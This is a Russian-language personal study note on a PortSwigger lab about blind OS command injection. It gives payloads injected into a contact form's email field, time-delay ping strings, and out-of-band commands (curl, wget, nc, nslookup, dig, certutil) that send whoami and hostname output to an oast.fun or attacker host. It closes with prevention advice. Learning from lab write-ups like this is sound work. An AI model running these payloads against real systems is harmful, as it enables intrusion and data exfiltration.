осн теория [[0_OSi_иньекции_теория_уязвимостей]]

доп теория к лабе
## Полезные команды

| Цель команды              | Linux                                 | Windows                   |
| ------------------------- | ------------------------------------- | ------------------------- |
| Имя текущего пользователя | `whoami`                              | `whoami`                  |
| Операционная система      | `uname -a`                            | `ver`                     |
| Конфигурация сети         | `ifconfig`                            | `ipconfig /all`           |
| Сетевые подключения       | `netstat -an`                         | `netstat -an`             |
| Запуск процессов          | `ps -ef`                              | `tasklist`                |
| Временная задержка        | & ping -c 10 127.0.0.1 &              | пингую 10 сек потом ответ |
|                           | \|\|ping%20-c%2010%20127.0.0.1%20\|\| |                           |
|                           | \|ping%20-c%2010%20127.0.0.1%20\|     |                           |
лаба
https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
# Blind OS command injection with time delays

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

-------

ориг запрос/ответ 

![[СнимокAILLM012.22.01.png]]

заметил аномалию
```
csrf=Yhz7WrJayeeXTLuBScX4QsrfMC1rSkeB&name=zheka&email=|&subject=12345&message=qwertyqwertyqwerty

----------
при внедрении символов шел внутрь поля email в ответе 500 ошибка "Could not save"
при внедрении в другие поля - ошибки нет

Поле email подставляется в системную команду (вероятно mail или скрипт отправки почты). Спецсимволы шелла вызывают сбой.

	подобрал пелоад 
	||ping%20-c%2010%20127.0.0.1%20||
	
	и увидел задержку в 10 сек на ответ.. лаба выполнена
	
	
	-----
	 пробовал выпролнить запрос к своему хост
	 ||curl+http://ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun||
	 выдал 500 ошибку
	 
	 wget http://ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun тоже 500
	 
	 
	 
	 
	 -------
	 netcat
	 
	 
	 echo+-e+"GET+/+HTTP/1.1\nHost:+ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun\n\n"+|+nc+ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun+80    тоже 500
	 
	 ||nslookup+`whoami`.ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun|| тоже 500
	 
	 ------
	 Через DNS
	 
	 ||dig+`hostname`.ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun||   200!!!!!!
	 команда хоть и выполнилась видимо. но коллбэка нет
	 
	 пробую свою другую облач функ
	 csrf=Yhz7WrJayeeXTLuBScX4QsrfMC1rSkeB&name=zheka&email=||dig+`hostname`.functions.yandexcloud.net/d4eehe74dgv6ukpc1q6t||&subject=12345&message=qwertyqwertyqwerty

	 но коллбэка  тоже нет, видимо там у них блокируется все
	 
	 значит:  исходящие HTTP/DNS-запросы блокируются на стороне лабораторной среды. Доступна только слепая эксплуатация через тайминги.
	 
```

хоть и не вышло сделать запрос на свой хост, но лабу выполнил..

использовал  **команды для OOB**
```bash
лин

curl http://attacker.oast.fun/$(whoami)
wget http://attacker.oast.fun
nslookup `hostname`.attacker.oast.fun
dig `id`.attacker.oast.fun
ping -c 1 attacker.oast.fun


винда

ping -n 1 attacker.oast.fun
nslookup %username%.attacker.oast.fun
certutil -urlcache -f http://attacker.oast.fun/file null

```

## КАК НЕ ДОПУСТИТЬ OS COMMAND INJECTION ?
### кратко - **НИКОГДА** не передавать польз ввод в шелл!

---

**НЕ ИСПОЛЬЗ СИСТЕМНЫЕ КОМАНДЫ**

- Нет `system()`, `exec()`, `shell_exec()`, `popen()`, `subprocess.call()`
- Нет вызова шелла вообще. **Совсем. Вообще. На/|.*
---

**ИСПОЛЬЗОВАТЬ ВСТРОЕННЫЕ БИБЛИОТЕКИ**

- Отправить почту → **SMTP-библиотека**, не `mail` команда
- Пинг → **сокеты/ICMP**, не `ping` утилита
- DNS → **DNS-библиотека**, не `nslookup`
---

**ВАЛИДАЦИЯ ВХОДНЫХ ДАННЫХ 

- Белый список: только `a-z0-9@._-` для email
- Никаких `| & ; $ () \` `{} [] <> ! # %`
- **НЕ ПОЛАГАЙСЯ ТОЛЬКО НА ЭТО** — обойдут так как есть тысячи вариантов комбинаций, которые можно обойти
---

**ЭСКЕЙПИНГ — ТОЛЬКО ЕСЛИ БЕЗ НЕГО НИКАК ВООБЩЕ НЕЛЬЗЯ ОБОЙТИСЬ..
- `escapeshellarg()`, `escapeshellcmd()` в PHP
- `shlex.quote()` в Python
- Но лучше **НЕ ИСПОЛЬЗОВАТЬ ШЕЛЛ ВООБЩЕ**
---

**МИНИМАЛЬНЫЕ ПРИВИЛЕГИИ*
- Веб-сервер не должен быть root
- Запускать от www-data / nobody
- Упал — не root, урон меньше
---

**ПРИНЦИП НАИМЕНЬШИХ ПРИВИЛЕГИЙ ДЛЯ ФАЙЛОВОЙ СИСТЕМЫ**
- Нет прав на зпись вне нужных директорий
- Нет доступа к `/bin`, `/usr/bin` без нужды
---

**РЕГУЛЯРНОЕ ТЕСТИРОВАНИЕ**

- SAST (статический анализ кода)
- DAST (пентест/сканирование)
---

**ИСПОЛЬЗОВАТЬ ПОЛИТИКИ БЕЗОПАСНОСТИ**
- AppArmor / SELinux — ограничить что может делать веб-сервер
- chroot / контейнеры — изоляция
---





